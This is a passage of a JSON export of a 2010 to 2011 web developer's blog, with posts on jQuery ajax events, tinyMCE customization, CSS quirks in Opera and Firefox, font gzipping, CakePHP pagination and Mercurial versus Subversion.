  "text": "<p>jQuery provides a nifty set of Ajax events that one could define to fire methods whenever an ajax request starts, stop, failed or succeed. It is quite useful actually, to display visual indicator once and for all without having to define the various callback on each ajax call.</p>\n<p>But it has one flaw. The <code>ajaxSuccess </code>callback only give access to the <code>event</code>, <code>XMLHttpRequest </code>object and the option object. There is no direct way to get the return data from the call.</p>\n<p>Well, you can still access it from the <code>XMLHttpRequest responseText</code> attribute but it is then your job to parse it according to its type, duplicating some of the code already called in the jQuery core.</p>\n<p>You can use the <code>$.httpData</code> to directly parse it, giving the XHR as first argument and the data type as the second one.</p>\n<pre><code lang=\"js\">$('#ajaxIndicator').bind('ajaxSuccess', function(event, xhr, options) {<br />\tvar data = $.httpData(xhr, options.dataType);<br />}</code></pre>\n<p> </p>",
  "publish_start": "2010-04-09 20:00:38",
  "slug": "missing-data-in-jquery-ajax-event-ajaxsuccess"
}, {
  "id": 71,
  "name": "Knowing if an element is in the DOM using jQuery",
  "text": "<p>If you ever need to know if the element you have a reference to is really in your page (or if it is an old reference to an element you've already replaced), you can use the <code>$.contains(container, contained)</code> method.</p>\n<p>I was just working on an AJAX paginated list of elements and I kept references to my <code>table</code> in vars to avoid re-querying it each time. But this reference where still 'correct' (ie. not null) even after having replaced the element with a new one (using .<code>replaceWith()</code> and even <code>.empty()</code> and <code>.remove()</code>)</p>\n<p>I added a check to see if the element was really in the DOM before using it, and if not requerying it and re-saving it in var</p>",
  "publish_start": "2010-04-10 21:08:55",
  "slug": "knowing-if-an-element-is-in-the-dom-using-jquery"
}, {
  "id": 72,
  "name": "Opening a new tab using Ctrl+Click on Opera",
  "text": "<p>One thing that bugs me everytime I use Opera are the weird keyboard shortcuts. You open link in a new tab by using the middle mouse button (classic) or Shift+click (less classic, we are accustomed to use the Ctrl+Click, Shift+Click being used to open in a new window).<br /><br />Today it was bugging me one too many times, so I decided to use the power of AutoHotKey to help fix this.</p>\n<p>Here is the little snippet I added to my default AutoHotKey script :</p>\n<pre lang=\"htaccess\"><code lang=\"ahk\">;        Open page in new tab in Opera using Ctrl + Click<br />#ifWinActive, ahk_class OpWindow<br />^LButton::Send +{LButton}<br />#IfWinActive</code></pre>\n<p>It basically catch every Shift+Click in Opera and return a Ctrl+Click instead, allowing me to finally open tabs the way I'm used to.</p>",
  "publish_start": "2010-04-12 12:07:01",
  "slug": "opening-a-new-tab-using-ctrl-click-on-opera"
}, {
  "id": 73,
  "name": "Rendering bug with generated content on form fields in Opera",
  "text": "<p>If you try the following code in Opera 10.51, you'll have some weird rendering bug :</p>\n<pre lang=\"html\"><code lang=\"html\">&lt;style&gt;<br />\t.test:after {<br />\t\tcontent:\"This should be on red background\";<br />\t\tbackground:red;<br />\t}<br /> &lt;/style&gt;<br /> Text input : &lt;input type=\"text\" value=\"I'm unstyled\" class=\"test\" /&gt;</code></pre>\n<p>The generated content is added to the page, but the background color isn't rendered. Worse, the input lose all styling, it does not have a background color nor borders anymore.</p>\n<p>The same effect also apply to every <code>input </code>(<code>radio</code>, <code>checkbox </code>and <code>password</code>).</p>\n<p>On a <code>select</code> tag, the generated content correctly have it's background color, but still lose all styling.</p>\n<p>On a <code>textarea</code>, the styling is gone too, and the background color is here. Well, sort of, it is actually cropped after a while and the end of the text is on transparent background.</p>\n<p>I sent a bug report to Opera about that.</p>\n<p style=\"text-align: center;\"><img src=\"files/2010/04/12/4bc2f9103d4c2.jpg\" alt=\"Opera, input  generated content bug\" width=\"580\" height=\"204\" /></p>",
  "publish_start": "2010-04-12 12:42:52",
  "slug": "rendering-bug-with-generated-content-on-form-fields-in-opera"
}, {
  "id": 74,
  "name": "Tweaking tinyMCE",
  "text": "<p>I'm in the process of tweaking a tinyMCE install to use a custom set of plugins and a custom skin to better fit in the Caracole CMS. This would allow me to re-use CSS and JS code I've already coded.</p>\n<p>Fortunatly, I'm getting better and better at understanding the way tinyMCE works and the various configuration options and how to tweak them.</p>\n<p>I also want the tinyMCE CSS rules to be integrated into the main CSS file of my app (packed and minified using CSSTidy). So I defined a custom skin in the tinyMCE setup, named '<code>caracole</code>'. This way, all the CSS skinning classes will be prefixed with <code>caracole </code>as I don't want to mess with the default skins.</p>\n<p>I also copied the <code>ui.css</code> file from the <code>themes/advanced/skins/default</code> to my own css directory, renamed it to <code>tinymce.css</code>, replaced all <code>.default</code> occurences to <code>.caracole</code> and added this file to the list of files being processed by the main packer.</p>\n<p>This way I can easily update any css file from the same directory, without having to dive into the tinymce subdirectories.</p>\n<p>Unfortunatly, by doing so, tinyMCE continue to load the <span class=\"objectBox objectBox-text\"><code>tiny_mce/themes/advanced/skins/caracole/ui.css</code> file (have a look at Firebug if you don't trust me). It took me some time to figure out where that call was made from. It is actually on <code>editor_template.js</code> (around line 150 in dev version). </span></p>\n<p>As I didn't want to load this file twice, I tried to disable this call. I could have manually patched the source file but I don't want to, it would make any future update a pain. So I tried to find an other way.</p>\n<p>Looking at the <code>loadCSS </code>method, it appears that there is a mechanism to prevent loading twice the same file. If the file is already present in the <code>.files</code> array, it won't be added. Ok, so now I just have to manually add the file before the call is made.</p>\n<p>That's where the setup callback come into play. I just defined in my inyMCE.init :</p>\n<pre><code lang=\"js\">tinyMCE.init({<br />\tskin: 'caracole',<br />\teditor_css: 'caracoleDoNotInclude',<br />\tsetup: function(editor) {<br />\t\ttinymce.DOM.files['http://'+document.domain+'/caracoleDoNotInclude'] = true;<br />\t}<br />}</code></pre>\n<p>Doing so, the <code>loadCSS </code>will try to load the <code>caracoleDoNotInclude</code> file (clearly this name is a placeholder, I have no such file). And in the setup method I manually tell tinyMCE that this file is already loaded so when it will initiate, it won't load the file at all.</p>\n<p>Same goes for the <code>content_css</code>, the file that handle the look and feel of the editable zone. I don't want to have my file in the tinyMCE skin directory, I'd rather have it with my other CSS files.</p>\n<p>So I defined a custom <code>content_css</code> to point to my file. I also had to update the setup method to mark the file as already loaded. But this time, as the file is loaded on a per instance basis, this is the <code>editor.dom.files</code> that I have to update, not the general <code>tinymce.DOM</code>.</p>\n<p>Fortunatly, the latest tinyMCE version expose their event API, so it was just a matter of defining the following event in the main setup :</p>\n<pre><code lang=\"js\">setup: function(editor) {<br />\ttinymce.DOM.files[baseUrl+'caracoleDoNotInclude'] = true;<br />\teditor.onPreInit.add(function(editor) {<br />\t\teditor.dom.files[baseUrl+'js/vendors/tiny_mce/themes/advanced/skins/caracole/content.css'] = true;<br />\t });<br /> },</code></pre>\n<h4>Edit :</h4>\n<p>Note that in the latest tinyMCE version, the code is slightly different because you have to call a special method on the url before adding it to the <code>editor.dom.files</code></p>\n<pre><code lang=\"js\">editor.onPreInit.add(function(editor) {<br />\teditor.dom.files[editor.baseURI.toAbsolute('http://'+document.domain+'/js/vendors/tiny_mce/themes/advanced/skins/caracole/content.css')] = true;<br />});</code></pre>\n<p> </p>",
  "publish_start": "2010-04-13 18:10:46",
  "slug": "tweaking-tinymce"
}, {
  "id": 265,
  "name": "Differences between Mercurial and Subversion",
  "text": "<p>People at my current job are using Subversion, and our project will be tracked using it. I never used Subversion before, the only versionning system I ever used was Mercurial. And moving from one to the other meant changing a lot of reflexs I had.<br />Here is a little list of changes, mostly as a reminder for myself.</p>\n<h4>Directories</h4>\n<p>Mercurial uses a single <code>.hg</code> directory at the root of your project to store all your project history while Subversion adds multiple <code>.svn</code> directories in each directory, to track history changes to that directory only.</p>\n<p>I prefer the Mercurial approach, it keeps all changes centralized in one place. You can simply remove the <code>.hg</code> directory to transform your versionned version into a stand-alone one.</p>\n<p>While the Subversion approach litters your app with countless hidden directories, making copy and pasting a real pain.</p>\n<h4>Centralised vs Distributed</h4>\n<p>Subversion is centralised while Mercurial is distributed. <br />As far as I understand the difference, it means that Subversion uses one main directory to store the versionned version and can deploy (export) a specific revision at anytime.</p>\n<p>That revision do not hold any history information, it is only a copy of your project at a given time.</p>\n<p>On the other hand, each Mercurial repository holds both the current public version and all the history. You do not have to deploy anything anywhere, just <code>update</code> your current repo with data from one of the revision.</p>\n<h4>Tortoise</h4>\n<p>I am using both TortoiseSVN and TortoiseHg. When you commit with TortoiseSVN it displays the list of files that where updated since the last commit. If you added new files, they won't show unless the \"Show unversionned files\" is checked.</p>\n<p>In TortoiseHg, all new files are automatically seen in the commit window, as well as a diff. It allows me the easily see what changes where made, and help me write my commit message. <br />I really like the TortoiseHg vision better.</p>\n<h4>Tracking directories</h4>\n<p>Subversion can track empty directory, just by adding them. Mercurial can't. You have to add an empty file in each to allow tracking.</p>\n<p>Also, when doing a commit in a specific directory in Mercurial, it will commit the whole repo, while with Subversion it will only commit the current repo. I can see the benefits of both and I'm not quite sure which is better.</p>\n<p>Subversion will allow me to do a commit of one special feature by committing only one directory, but the TortoiseHg integration help me doing commits more easily no matter where I'm browsing.</p>\n<h4>Ignoring files</h4>\n<p>I have some files in my project I don't want to track (like auto-generated cache files). In Mercurial, all I need is editing the <code>.hgignore</code> file with regexps. The syntax can be a little strange sometimes, it took me a while to correcly understand it, but it definitely works.</p>\n<p>On Subversion, I can add files to the ignore list so they don't show as \"unversionned\", but I can also add a <code>svn:ignore </code>property to a specific directory to set regexp to files that I don't want to track. The end result is the same, but the way Mercurial handle it with one file is more appealing to me.</p>\n<h4>Conclusion</h4>\n<p>Having all history in one dir and all ignore rules in one files seems a better approach to me. I guess on some aspects Mercurial is still more centralised than Subversion.</p>",
  "publish_start": "2011-02-23 12:30:18",
  "slug": "differences-mercurial-subversion"
}, {
  "id": 78,
  "name": "The blockquote cite attribute",
  "text": "<p>The HTML blockquote element can accept a cite attribute that is supposed to hold the value of the source URI of the quote.</p>\n<p>Browsers behave differently when getting this attribute in javascript. Opera and Firefox automatically treat it as a URL, prepending the current domain host if none is defined and encoding special characters.</p>\n<p>Safari and Chrome on the other end just return the value as it is present in the HTML.</p>",
  "publish_start": "2010-04-19 09:34:31",
  "slug": "the-blockquote-cite-attribute"
}, {
  "id": 79,
  "name": "Setting the size of a tab character in a pre element",
  "text": "<p>When displaying code in an HTML page, you often want it to be correctly indented with tabs. Unfortunatly, setting a <code>white-space:pre </code>(like is the default on a &lt;pre&gt; element) to an element will transform any tab in the equivalent of 8 space characters.</p>\n<p>8 is way more than needed, 4 will be much suited, specially in a website design where the horizontal space is limited.</p>\n<p>I've googled a lot, going from obscure old CSS drafts to proprietary implementation mailing lists, browsing CSS codes.</p>\n<p>One <a href=\"http://www.phwinfo.com/forum/comp-inf-authoring-css/365851-change-tab-width-using-css.html\">interesting discussion can be found here</a>, there even is a <a href=\"http://www.w3.org/People/howcome/t/970224HTMLERB-CSS/WD-tabs-970117.html\">proposal for a tab-stops property</a> on the W3C</p>\n<p>Opera has a proprietary <code>-o-tab-size</code>. You just have to pass the number of space characters that should be used.</p>\n<p>That's all I have for now...</p>\n<p>I know I could replace every<code> \\t</code> with 4 <code>&amp;nbsp;</code>, or with a <code>&lt;span&gt;</code> that I'll style to match the desired width but it involves a back-end processing and I would have liked to style it directly.</p>\n<p>Edit : There seems to have a <code>-moz-tab-size</code> property on the latest Firefox 3.7 nightlies</p>",
  "publish_start": "2010-04-19 11:39:12",
  "slug": "setting-the-size-of-a-tab-character-in-a-element"
}, {
  "id": 80,
  "name": "How to select the first element of a given class",
  "text": "<p>Imagine the following HTML code :</p>\n<pre class=\"code\"><code lang=\"html\">&lt;div class=\"wrapper\"&gt;<br />[... various HTML elements ...]<br />\t&lt;div class=\"bar\"&gt;bar&lt;/div&gt;<br />\t&lt;div class=\"foo\"&gt;foo&lt;/div&gt;<br />\t&lt;div class=\"bar\"&gt;bar&lt;/div&gt;<br />\t&lt;div class=\"foo\"&gt;foo&lt;/div&gt;<br />&lt;/div&gt;</code></pre> <p>How would one style the first <code>div.foo</code> ?</p>\n<p>I've tried <code>div.wrapper div.foo:first-of-type</code> but unfortunatly it does not work. In fact the previous rule can be translated into \"select the first child of div.wrapper only if it is a div.foo\" and not \"select the first div.foo inside div.wrapper\" as I imagined.</p>\n<p>Using jQuery I could do a <code>$('div.wrapper div.foo:first')</code> but there's no such selector in CSS.</p>",
  "publish_start": "2010-04-20 17:55:38",
  "slug": "how-to-select-the-first-element-of-a-given-class"
}, {
  "id": 81,
  "name": "You should always test on older browser versions",
  "text": "<p>You probably already have installed on your computer various web browsers (FF, IE, Safari, Opera and Chrome) to test your websites. You most certainly also have multiple installs of IE (or are using IETester) because the underlying engine of those browser is very different from one version to another.</p>\n<p>Firefox, Safari, Opera and Chrome users are more educated to the \"always update to latest version\" paradygm so you rarely have to debug old and obscure version of those browsers.</p>\n<p>At least it was what I thought until I was stucked with an old 3.0 version of Firefox on my laptop (mostly due to my inability to upgrade to the latest version. I'm still new to the linux world and my laptop is running ubuntu). Anyway, it made me understand that even if you are willing to upgrade you can't always do it and old browser versions should be supported too.</p>\n<p>In a recent CSS experiment, I managed to style checkboxes and radio buttons in pure CSS. Unfortunatly, because I was using some \"advanced\" CSS selectors, FF3.0 wasn't able to render it correctly, in fact it was able to render only half the rules, making the whole thing totally unusable.</p>\n<p>That was a perfect example of an old browser I had to debug. I will not dive into the details of the CSS (mostly because I haven't fixed it completly), and this post was only to remind you (and me) to always check on previous browser versions.</p>\n<p>Next post will be explaining how to test on multiple Firefox versions side by side.</p>",
  "publish_start": "2010-05-04 12:28:12",
  "slug": "you-should-always-test-on-older-browser-versions"
}, {
  "id": 82,
  "name": "Changing Firefox language",
  "text": "<p>I'm French, live in France, but usually prefer having my software in English.</p>\n<p>This is so because english words are generally shorter (and thus fits more easily in a GUI) and most of the time french translations aren't optimal.</p>\n<p>I just download the latest Firefox version from their website, and without knowing it, it was a French localized one. They do some sniffing on the user agent string and automatically download the corresponding file.</p>\n<p>That seems a great idea, but I prefer my software in english, so I searched for a <code>en-US.xpi</code> file to update firefox. It does exists for any other language, but not for <code>en-US</code>, this being the default language, as stated in <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=485860\">this bug report</a>.</p>\n<p>It seems the only way to have an english Firefox is to download the english version, there is no way to change it afterwards.</p>\n<p>You can type <code>about:config</code> and change the <code>general.useragent.locale</code> value to <code>en-US</code> but it does not update the main language, only tell plugins to use that language (AFAIK).</p>\n<p>Changing the language in the options only change the user agent string.</p>\n<p>Well, I had to backup my profiles, uninstall FF, download the english version and reinstall it.</p>",
  "publish_start": "2010-05-04 13:47:36",
  "slug": "changing-firefox-languages"
}, {
  "id": 83,
  "name": "Running multiple Firefox versions side by side on Windows",
  "text": "<p>Whenever you upgrade your Firefox, the new version will overwrite the previous one. If you want to open multiple Firefox versions side by side, here's my way :</p>\n<ul>\n<li>First, uninstall all your previous Firefox installation(s). Make sure to backup any important data beforehand (I personnaly use MozBackup to do that).</li>\n<li>Then install the latest available stable version. This will be the main Firefox version, the one you'll be using on your dayjob and the one you'll always update.</li>\n<li>Now run the Firefox ProfileManager.<br /> To do that, create a shortcut to your <code>firefox.exe</code> file, then edit this shortcut. In the \"Target\" field, add <code>-Profilemanager</code>.<br />My field looks like : <code>\"C:\\Program Files\\Internet\\Firefox\\firefox.exe\" -Profilemanager</code></li>\n<li>You now have to create one new profile for each FF version you plan on testing. Give them meaningful names. I named mine \"FF3.0\".</li>\n<li>Now download the corresponding Firefox version from <a href=\"http://www.oldversion.com/Mozilla-Firefox.html\">oldversion.com</a></li>\n<li>Do not install it, but extract its content (using a archiving tool like winrar or 7-zip) in a tmp directory. Remove the <code>optional </code>directory as well as <code>removed-files.log</code> and <code>setup.exe</code>.</li>\n<li>Copy the content of <code>localized/</code> into <code>nonlocalized/</code> (overwrite files if asked).</li>\n<li>You can now rename the <code>nonlocalized/</code> directory and move it around on your hard drive.<br /> I renamed mine to <code>Firefox 3.0/</code> and put it alongside the main Firefox, in <code>C:\\Program Files\\Internet\\Firefox 3.0\\</code></li>\n<li>Create a shortcut to the <code>firefox.exe</code> file in this directory and edit the target field. <br />This time, we have to specify which profile to use. Just add <code>-P \"FF3.0\" -no-remote</code> in the target field.<br />Mine now looks like <code>C:\\Program Files\\Internet\\Firefox 3.0\\firefox.exe\" -P \"FF3.0\" -no-remote</code></li>\n</ul>\n<p>That's it.<br />Now, just run your classic Firefox shortcut to open the most up to date Firefox version, and use the custom shortcuts to open previous versions.</p>\n<p>I personnaly also rename the different <code>firefox.exe</code> to <code>firefox30.exe</code>, or <code>firefox35.exe</code> to more easily spot them in the taskmanager.</p>\n<p>I also edit each <code>.exe</code> with ResHack to change their taskbar icons. I haven't yet managed to change their title.</p>\n<p>Edit : Now I can't open .html files directly from the explorer nor follow links from my IM. I still don't know exactly what of the steps above caused that.</p>",
  "publish_start": "2010-05-04 16:06:09",
  "slug": "running-multiple-firefox-versions-side-by-side-on-windows"
}, {
  "id": 84,
  "name": "Using :after and :before",
  "text": "<p><code>:after</code> and <code>:before </code>pseudo-elements allow one to add generated content before or after an other element. It can be used to add quotes around text, icons after a link to specify the language of the target page and a lot of other useful stuff like that.</p>\n<p>It can also be mastered to create more powerful styling. I'll post more about that later.</p>\n<p>Anyway, IE6 and IE7 don't support it. Firefox is supposed to support it from the 3.0 version but in fact it is still buggy in this release.</p>\n<p>Pseudo-elements must be inline elements and can't be absolutly positionned in FF3.0, thus greatly reducing the number of fun things we could do with them in this browser.</p>\n<p>It faced me with a challenge. If I wrote <code>:before</code> and <code>:after</code> rules, they would be only understood by FF3.0 but badly rendered, resulting in half the styling I expected.</p>\n<p>Browsers that don't understand the rules would not apply them and keep the default rendering, compliant browsers will render all the rules, but the grey area in between is filled with FF3.0 that will think it can handle them and will finally badly render them.</p>\n<p>I haven't found a way to specificaly target FF3.0, so I used an alternate method.</p>\n<p>All the browsers that understand the <code>:only-of-type</code> selector also understand <code>:before</code>/<code>:after</code>. But FF3.0 and IE7 do not understand <code>:only-of-type</code>. So if I wrote a rule starting with <code>body:only-of-type</code>, it will only be applied to browsers with complete <code>:after</code> and <code>:before </code>support (excluding FF3.0). This solved my problem.</p>\n<p>Unfortunatly, it will also filter out IE7 who does not understand <code>:only-of-type</code> but does understand <code>:after</code>/<code>:before</code>. I usually remove all fancy form styling for IE anyway so that's not a big deal for me, but if you really care, you just have to override the rule in a IE7 specific stylesheet.</p>",
  "publish_start": "2010-05-04 19:13:39",
  "slug": "using-after-and-before"
}, {
  "id": 85,
  "name": "Preventing Firefox from auto-filling login and password fields",
  "text": "<p>When you login in an app and tell Firefox to remember your password, it will then automatically fill any password field that have a login field near it.</p>\n<p>It can be quite embarassing when you are developping an admin panel where you can edit your own profile informations. The password field will be filled every time you go to that page, even if you explicitly set no value.</p>\n<p>The way to circumvent this is to add an <code>autocomplete=\"off\"</code> attribute to the field.</p>\n<p>It may not validate, but is understood both by IE and FF AFAIK.</p>",
  "publish_start": "2010-05-05 17:19:13",
  "slug": "preventing-firefox-from-auto-filling-login-and-password-fields"
}, {
  "id": 86,
  "name": "@font-face with multiple fonts and CSSTidy",
  "text": "<p>The <code>.woff</code> font extension is the standard-to-go in terms of font embedding on the web.</p>\n<p>You should add them first in the order of fonts you're loading, before the <code>.ttf</code>/<code>.otf</code> ones.</p>\n<pre lang=\"css\"><code lang=\"css\">@font-face {<br />\tfont-family: \"Unibody8SmallCaps Regular\";<br />\tsrc: url('fonts/unibody_8-smallcaps-webfont.woff') format('woff'), url('fonts/unibody_8-smallcaps-webfont.ttf') format('truetype');<br />}</code></pre> <p>The interesting thing to note is that you cannot omit the quotes around the <code>format('woff')</code>/<code>format('truetype')</code> part. Otherwise the font won't be recognized (at least by FF3.6).</p>\n<p>CSSTidy seems to have a bug when there are multiple <code>format() </code>declarations in a rule, it removes quotes in each of them except the last one, thus making the whole rule unparsable by the browser.</p>\n<p>So I started, again, to dig into the CSSTidy code and see what I could do about that.</p>\n<p>I updated the <code>csstidy.php</code> file at around line 847 and changed the <code>if</code> statement to look like this :</p>\n<pre lang=\"php\"><code lang=\"php\">if($this-&gt;sub_value != '') {<br />\t$this-&gt;sub_value_arr[] = $this-&gt;sub_value;<br />\tforeach($this-&gt;sub_value_arr as &amp;$sub_value) {<br />\t\tif (substr($sub_value, 0, 6) == 'format') {<br />\t\t\t$sub_value = str_replace(array('format(', ')'), array('format(\"', '\")'), $sub_value);<br />\t\t}<br />\t}<br />\t$this-&gt;sub_value = '';<br />}</code></pre> <p>This way all sub values of the <code>src:</code> rule will be correctly parsed, and not only the last one.</p>",
  "publish_start": "2010-05-07 14:37:00",
  "slug": "csstidy-and-the-woff-fonts"
}, {
  "id": 87,
  "name": "Gzipping your font files",
  "text": "<p>When using <code>@font-face</code> to display fonts, you have to create a whole bunch of font files on your server to accomodate the quirks of the various browsers.</p>\n<p>If you do things right (or follow the automatic kit build of FontSquirell), you should get a <code>.eot</code> file for IE, a <code>.ttf</code>/<code>.otf</code> file for current browsers, a <code>.svg</code> file for Chrome and the iPhone/iPad and a <code>.woff</code> file for the next browser generation.</p>\n<p>Unfortunatly, you'll have to cope with that because there isn't much we can do about it at the moment.</p>\n<p>But you can compress those files to make the font rendering faster. Some browsers even download all the fonts even if they will only use one, so compress them !</p>\n<p>The easiest way is to configure your server to automatically gzip them. You should already have done that for your css and js file so it is just a matter of adding new types.</p>\n<p>As far as I know <code>.otf</code> and <code>.ttf</code> files don't have registered mimetype, so I had to create a dummy one for them in my .htaccess :</p>\n<pre lang=\"htaccess\"><code lang=\"apache\">AddType x-font/otf    .otf<br />AddType x-font/ttf    .ttf<br />AddType x-font/eot    .eot</code></pre> <p>I also added the <code>.eot</code> because even if an <code>application/vnd.ms-fontobject</code> mimetype is registered for this obscure microsoft format, when I tried to add a deflate rule on it, my Apache crashed so I took the safest way of defining a custom mimetype.</p>\n<p>I prefixed them with an <code>x- </code>to make sure that it won't mess with existing mimetypes.</p>\n<p>The second part was to add gziping to those</p>\n<pre lang=\"htaccess\"><code lang=\"apache\">AddOutputFilterByType DEFLATE x-font/otf x-font/ttf x-font/eot</code></pre> <p>SVG files are in fact xml files, and you should already have them gzipped, so no need to add them here.</p>\n<p>I haven't included <code>.woff</code> files because <code>.woff</code> files are already compressed files, so you don't need to gzip them.</p>",
  "publish_start": "2010-05-11 15:32:00",
  "slug": "gzipping-your-font-files"
}, {
  "id": 88,
  "name": "Using custom find and paginate methods in cakePHP 1.3",
  "text": "<p>For the blog plugin I'm writing I needed a way to fetch only blog posts that were actually published. I didn't want to write the find conditions every time I had to make a request so I tried to define a custom find method.</p>\n<p>I remember having read something about that a while ago, in a blog or in a changelog and so I thought it will be quite easy to implement using some cake automagic.</p>\n<p>It was not that easy, I had to override two core methods in my <code>AppModel</code>, but here the result :</p>\n<h4>Using custom find methods</h4>\n<p>I wanted to be able to call my custom method writing <code>$this-&gt;Post-&gt;find('published')</code> so I created a <code>__findPublished()</code> method in my Post model.</p>\n<p>It basically returns a <code>find('all')</code> with custom conditions.</p>\n<p>I then edited my AppModel file to hook on the default <code>find()</code> method :</p>\n<pre><code lang=\"php\">function find($type, $options = array(), $order = null, $recursive = null) {<br />\t$methodName = '__find'.ucfirst($type);<br />\t// Using default method if not defined<br />\tif (!method_exists($this, $methodName)) {<br />\t\t// We force default fields and order keys or we could run into trouble for undefined index<br />\t\t$options = Set::merge(array('fields' =&gt; array(), 'order' =&gt; array()), $options);<br />\t\treturn parent::find($type, $options, $order, $recursive);<br />\t}<br />\t// Using custom method<br />\treturn $this-&gt;{$methodName}($options, $order, $recursive);<br />}<br /></code></pre>\n<p>(Note that there may still be some issues with this method, especially if the $type parameter is not a string. I'm always using the <code>find()</code> method with a string as first argument but maybe you're not, or the core still use the old implementation.)</p>\n<p>Anyway, what it does is testing if a <code>__findSomething()</code> method is defined, and if it is it returns its results, otherwise it just delegates to the default <code>find()</code> method.</p>\n<h4>Using custom find methods in paginate</h4>\n<p>So far, so good. But now how do you tell cake to use this custom find when paginating stuff ? The first part is easy (but required some digging into the core code). It appears that if the zero key of the <code>$paginate</code> var is set to a string, this will be used as the find type.</p>\n<p>One easy way to do this is calling <code>array_unshift($this-&gt;paginate, 'published')</code> just before the <code>$this-&gt;paginate('Post')</code> call in the controller.</p>\n<pre><code lang=\"php\">// Getting the paginated post list<br />array_unshift($this-&gt;paginate, 'published');<br />$itemList = $this-&gt;paginate($this-&gt;model);<br />$this-&gt;set('itemList', $itemList);<br /></code></pre>\n<p>You'll notice that your custom find method is used for the pagination. What you may not notice at first sight is that the total count of results is not correct. Cake still uses the default <code>find('count')</code> without using the custom method.</p>\n<p>We will now need to create a <code>__paginateCountPublished()</code> method in our <code>Post </code>model that will return the total count of posts to paginate.</p>\n<p>Forcing Cake to do what we want is a little trickier this time. We will need to create a <code>paginateCount()</code> method in our <code>AppModel</code>. If such a method exists for a given model, Cake will use it instead of the default <code>find('count')</code> when paginating results. By creating it in the <code>AppModel </code>we make sure that all the paginate counts use it.</p>\n<p>This method takes a third argument called $extra which will contain our custom find name. If set, we will return the custom paginate count. If not set, we revert to the default way of calculating the total count (copy/pasted from the core).</p>\n<p>So, here the <code>paginateCount()</code> method to add to your <code>AppModel </code>:</p>\n<pre><code lang=\"php\">function paginateCount($conditions = array(), $recursive = null, $extra = array()) {<br />        // If no custom find specified, we return the default count<br />        if (empty($extra['type'])) {<br />            $parameters = compact('conditions');<br />            if ($recursive != $this-&gt;recursive) {<br />                $parameters['recursive'] = $recursive;<br />            }<br />            return $this-&gt;find('count', array_merge($parameters, $extra));<br />        }<br /><br />        // We return the __paginateCountSomething<br />        $methodName = '__paginateCount'.ucfirst($extra['type']);<br />        return $this-&gt;{$methodName}($conditions, $recursive, $extra);<br />    }<br /></code></pre>\n<p>And don't forget to create a<code> __paginateCountPublished($conditions = array(), $recursive = null, $extra = array())</code> method in your <code>Post </code>model</p>\n<h4>And you're done</h4>\n<p>You can now do some <code>$this-&gt;Post-&gt;find('published')</code> magic in your controller. And don't forget the <code>array_unshift()</code> tip to use the custom find in a paginate call, it have to be the first key.</p>",
  "publish_start": "2010-05-11 18:43:00",
  "slug": "using-custom-find-and-paginate-methods-in-cakephp-1-3"
}, {
  "id": 89,
  "name": "Give your variables meaningful names",
  "text": "<p>I just realized that the fullscreen plugin I was using with tinyMCE (v3.3.5) was throwing an error in my Firebug panel everytime I closed it.</p>\n<p>As I wrote some tinyMCE plugins myself I thought I may have done something that was causing this. So I opened up the javascript file and checked for the error line :</p>\n<pre><code lang=\"js\">var win, de = DOM.doc.documentElement;<br />if (ed.getParam('fullscreen_is_enabled')) {<br />\tif (ed.getParam('fullscreen_new_window')) <br />\t\tcloseFullscreen(); // Call to close in new window<br />\telse {<br />\t\tDOM.win.setTimeout(function() {<br />\t\t\ttinymce.dom.Event.remove(DOM.win, 'resize', t.resizeFunc);<br />\t                tinyMCE.get(ed.getParam('fullscreen_editor_id')).setContent(ed.getContent({format : 'raw'}), {format : 'raw'});<br />\t                tinyMCE.remove(ed);<br />\t                DOM.remove('mce_fullscreen_container');<br />\t                ed.style.overflow = ed.getParam('fullscreen_html_overflow');<br />\t                DOM.setStyle(DOM.doc.body, 'overflow', ed.getParam('fullscreen_overflow'));<br />\t                DOM.win.scrollTo(ed.getParam('fullscreen_scrollx'), ed.getParam('fullscreen_scrolly'));<br />\t                tinyMCE.settings = tinyMCE.oldSettings; // Restore old settings<br />\t\t}, 10);<br />\t}<br />        return;<br />}<br /></code></pre><p>If you're not familiar with the complex tinyMCE syntax this may seems a little... well... complex.  I'll focus on the error line but I wanted to paste the whole code block so you can see my point.</p>\n<p>The error line is this one :</p>\n<pre><code lang=\"js\">ed.style.overflow = ed.getParam('fullscreen_html_overflow');<br /></code></pre><p>Of course it will throw an error, we try to access a property of an element we just removed from the DOM (two lines before : <code>tinyMCE.remove(ed);</code>). Why would someone want to do that ?</p>\n<p>Well in fact, this is not <code>ed</code> (that we should try to access, but <code>de</code> (short for <code>DOM.doc.documentElement</code>). In fact the code was correct in 3.3.2, but someone changed it around 3.3.3.</p>\n<p>My guess is that someone had the file opened, saw this bit of code, spotted the <code>de</code>, and seeing a lot of references to <code>ed</code> all around, thought it was a typo and 'fixed' it.</p>\n<p>Reading the tinyMCE code (whenever you want to understand how it works, or want to study plugins before creating your own) is pretty hard. There are almost no comments, and variable names are only one or two letters long.</p>\n<p>The tinyMCE team released a survey asking user what should be improved on the tinyMCE product. I answered it, and my main point was to improve documentation, because reading the tinyMCE core to understand its inner goings is quite a chore.</p>",
  "publish_start": "2010-05-11 19:25:00",
  "slug": "give-your-variables-meaningful-names"
}, {
  "id": 159,
  "name": "Tabindexing and inserting tabs with tinyMCE",
  "text": "<p>You may have noticed that you can't press tab to jump from field to field in a form that uses tinyMCE. There is a plugin named <code>tabfocus </code>in the core that is here to allow just that.</p>\n<p>But it does not seem to work correctly if you already have tabindex values defined on your inputs. So I decided to code my own.</p>\n<p>I choose the easiest way, letting the browser do most of the job. I only copied the textarea <code>tabindex </code>value to the create iframe and it did the trick.</p>\n<p>I created a tinyMCE for that, here the code of the init() method. By the way, I'm using the jQuery version of tinyMCE.</p>\n<pre><code lang=\"js\">init : function(editor, url) {<br />\t// We set a tabindex value to the iframe instead of the initial textarea<br />\teditor.onInit.add(function() {<br />\t\tvar editorId = editor.editorId;<br />\t\tvar textarea = $('#'+editorId);<br />\t\t$('#'+editorId+'_ifr').attr('tabindex', textarea.attr('tabindex'));<br />\t\ttextarea.attr('tabindex', null);<br />\t});<br />}<br /></code></pre><p>What it does is grabbing the initial <code>tabindex </code>value of your textarea and setting it to the tinyMCE iframe. You have to wrap this in <code>onInit.add</code> because at the time the plugin <code>init </code>method is called, the iframe is not yet created. I also removed the <code>tabindex </code>value from the original textarea, two elements aren't supposed to have the same <code>tabindex </code>value.</p>\n<p>This method does not work in Chrome. Chrome always add a tab character when you press the tab key in a tinyMCE editor, it does not jump to the next tabindexed element. Is that a good behavior ? I don't know, it surely is useful to be able to insert tab characters, but it also is useful to tab through the whole 